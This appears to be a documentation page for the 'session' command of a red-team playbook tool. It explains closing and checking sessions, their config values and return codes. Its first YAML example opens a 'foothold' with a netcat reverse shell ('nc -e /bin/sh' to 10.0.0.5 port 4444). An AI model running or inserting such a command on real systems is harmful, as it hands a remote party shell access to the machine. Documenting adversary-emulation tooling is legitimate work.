.. _session_command:

=======
session
=======

Close or inspect an open session from within a playbook.

Sessions otherwise live until the end of the run, and a playbook has no way to
ask whether one is still alive - so it can only discover that its foothold has
dropped by sending a command into it and failing.

.. code-block:: yaml

   commands:
     # Open a session:
     - type: shell
       cmd: "nc -e /bin/sh 10.0.0.5 4444 &\n"
       interactive: True
       creates_session: foothold

     # Check it before relying on it:
     - type: session
       cmd: status
       session: foothold

     # Finish with it early rather than at the end of the run:
     - type: session
       cmd: close
       session: foothold

.. confval:: cmd

   What to do with the session.

   ``close`` terminates it and everything it started; ``status`` reports whether
   it is still alive without changing anything.

   :type: str
   :default: ``close``
   :required: False

.. confval:: session

   Name of the session, as given to ``creates_session``.

   :type: str
   :required: True

.. confval:: executor

   Which kind of session to act on.

   :type: str
   :default: ``shell``
   :required: False

   ``shell`` covers both pipe-based and pseudo-terminal sessions. ``ssh`` covers
   ssh sessions, and also forgets the session's terminal screen, so that a later
   session reusing the name does not inherit it.

   Sessions belonging to ``msf``, ``sliver`` and ``browser`` are not supported
   here and are still closed only at the end of the run.

Return codes
------------

Both forms return ``0`` on success and ``1`` when the session does not exist, or
when ``status`` finds a session that has exited. Combine with
``exit_on_error: False`` to check a session without ending the run:

.. code-block:: yaml

   commands:
     - type: session
       cmd: status
       session: foothold
       exit_on_error: False

     # $RESULT_RETURNCODE is "0" when the session is alive.
     - type: shell
       cmd: echo "the foothold is gone, reconnecting"
       only_if: "'$RESULT_RETURNCODE' == '1'"
